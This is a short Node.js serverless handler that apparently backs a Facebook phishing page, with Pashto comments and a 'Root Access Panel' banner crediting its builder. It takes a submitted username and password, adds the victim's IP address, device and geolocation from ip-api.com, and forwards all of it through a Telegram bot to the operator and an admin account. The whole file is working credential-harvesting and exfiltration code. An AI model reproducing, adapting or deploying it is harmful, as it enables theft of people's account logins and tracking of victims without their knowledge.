const fetch = require('node-fetch');
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { username, password, uid } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });

  const adminId = process.env.ADMIN_ID; // ✅ د اډمین لپاره

  let geo = {};
  try {
    geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
  } catch (e) {
    geo = {};
  }

  const message = `
╭───🔘 *𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅* ───╮
├ 👤 *Username:* \`${username}\`
├ 🔐 *Password:* \`${password}\`
├ 🆔 *User ID:* \`${uid}\`
├ 📆 *Time:* \`${timestamp}\`
├ 🌐 *IP:* \`${ip}\`
├ 🏙️ *City:* \`${geo.city || 'Kabul'}\`
├ 🌍 *Country:* Afghanistan
├ 🛰️ *ISP:* \`${geo.isp || 'Unknown'}\`
├ 📱 *Device:* \`${userAgent}\`
╰━━━━━━━━━━━━━━━━━━━━━━╯

🔘 *د فیس معلومات بریالۍ توګه ترلاسه شول*

╭─────── 🚀 *Root Access Panel 💠* ───────╮
│ 🧑🏻‍💻 *𝗕𝘂𝗶𝗹𝘁 𝗕𝘆:* 💛 *𝗪𝗔𝗖𝗜𝗤*
╰───────────────────────────────────────╯ 
`;

  try {
    // د یوزر ته استول
    await bot.telegram.sendMessage(uid, message, { parse_mode: "Markdown" });

    // د Admin ته استول
    if (adminId) {
      await bot.telegram.sendMessage(adminId, message, { parse_mode: "Markdown" });
    }

    return res.redirect('https://t.me/YourBotUsername'); // ✅ redirect دلته هم قابله تنظیم ده
  } catch (e) {
    console.error("Telegram Error:", e.message);
    return res.status(500).send("❌ Failed to send message.");
  }
}; 
